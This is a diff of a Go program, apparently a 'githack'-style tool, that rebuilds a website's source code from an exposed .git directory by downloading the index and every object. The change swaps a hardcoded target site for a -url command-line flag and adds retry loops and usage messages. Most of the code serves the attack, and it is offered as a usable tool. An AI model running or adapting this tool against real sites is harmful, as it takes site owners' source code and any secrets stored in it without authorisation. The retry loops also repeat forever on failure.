@@ -1,14 +1,14 @@
 package main
 
 import (
-    "fmt"
     "os"
+    "fmt"
+    "flag"
     "sync"
-    "runtime"
-    "strings"
-    "errors"
     "bytes"
+    "errors"
     "net/url"
+    "strings"
     "net/http"
     "io/ioutil"
     "compress/zlib"
@@ -16,7 +16,7 @@ import (
 )
 
 var (
-    attackUrl string = "http://bbs.17k.com/.git"
+    attackUrl string
     wg sync.WaitGroup
 )
 
@@ -60,16 +60,20 @@ type ceBody struct {
     Name      string
 }
 
-func HttpGet(url string) []byte {
+func HttpGet(url string) ([]byte, int) {
     resp, err := http.Get(url)
     if err != nil {
-        return make([]byte, 1)
+        return make([]byte, 1), 500  /*请求失败，伪装为服务器内部错误*/
     }
 
     defer resp.Body.Close()
     body, err := ioutil.ReadAll(resp.Body)
-    if err != nil {}
-    return body
+    return body, resp.StatusCode
+}
+
+func die(content string) {
+    fmt.Println(content)
+    os.Exit(-1)
 }
 
 func CheckSign(head []byte) bool {
@@ -144,7 +148,15 @@ func GetBlobHeadLen(cb ceBody) int {
 func GetObject(cb ceBody) []byte {
     prefix, suffix :=  Bytes2Sha1(cb.EntryBody.Sha1)
     url := fmt.Sprintf("%s/objects/%s/%s", attackUrl, prefix, suffix)
-    return HttpGet(url)
+    LABEL: 
+        body, statusCode := HttpGet(url)
+        switch statusCode {  
+        case 500:
+            goto  LABEL
+        default:
+            break
+        }
+    return body
 }
 
 func UnzipBytes(input []byte) ([]byte, error) {
@@ -161,11 +173,12 @@ func UnzipBytes(input []byte) ([]byte, error) {
 func Write(path string, content []byte, length int) {
     MkdirFromPath(path)
     if data, err := UnzipBytes(content); err == nil {
-        if err := ioutil.WriteFile(path, data[length:], 0777); err != nil {
-            fmt.Println(err)
-        } else {
-            fmt.Printf("%s OK\n", path)
-        }
+        LABEL: /*to many file open*/
+            if err := ioutil.WriteFile(path, data[length:], 0777); err != nil {
+                goto LABEL
+            } else {
+                fmt.Printf("%s OK\n", path)
+            }
     } else {
         fmt.Printf("%s %s\n", path, err)
     }
@@ -184,12 +197,10 @@ func ParseIndex(index []byte) {
     var thisEntrySize int
     binary.Read(bytes.NewBuffer(index), binary.BigEndian, &h)
 
-    runtime.GOMAXPROCS(10) /*协程数量*/
-
     var offset int = headSize
     if CheckSign(h.Sign[:]) && CheckVersion(h.Version) {
-        fmt.Println(h.EntryNum)
-        for i := 0; i < int(h.EntryNum); i++ {
+        num := int(h.EntryNum)
+        for i := 0; i < num; i++ {
             thisEntrySize = entrySize
             binary.Read(bytes.NewBuffer(index[offset:]), binary.BigEndian, &thisEntryBody)
             offset += thisEntrySize
@@ -200,13 +211,11 @@ func ParseIndex(index []byte) {
                 PadEntry(index, &offset, thisEntrySize) /*每个entry都为8的整数倍*/
                 entry := ceBody{thisEntryBody, thisEntrySize, thisEntryName}
                 wg.Add(1)
-                //fmt.Println(thisEntryName)
                 go TaskFunc(entry)
             } else { /* good luck */}
         }
-        wg.Wait()
     } else {
-      os.Exit(-1)
+        die("不是一个有效git地址") 
     }
 }
 
@@ -218,18 +227,40 @@ func GetHostFromUrl(attackUrl string) string {
     }
 }
 
-func run(index []byte) {
-    host := GetHostFromUrl(attackUrl)
+func MkAndChdir(host string) {
     if err := os.MkdirAll(host, 0777); err != nil {
         panic(err)
     }
     if err := os.Chdir(host); err != nil {
         panic(err)
     }
+}
+
+func GetGitIndex() []byte {
+    index, statusCode := HttpGet(attackUrl + "/index")
+    if statusCode == 404 {
+        die("页面访问404")
+    }
+    return index
+}
+
+func hack() {
+    host := GetHostFromUrl(attackUrl)
+    MkAndChdir(host)
+    index := GetGitIndex()
     ParseIndex(index)
 }
 
+func ParseArgs() {
+    flag.StringVar(&attackUrl, "url", "", "Please input hack git's url")
+    flag.Parse()
+    if attackUrl == "" {
+        die("Usage: ./githack -url=http://localhost/.git")
+    }
+}
+
 func main() {
-    index := HttpGet(attackUrl + "/index")
-    run(index)
+    ParseArgs()
+    hack()
+    wg.Wait() /*等待所有协程结束*/
 }
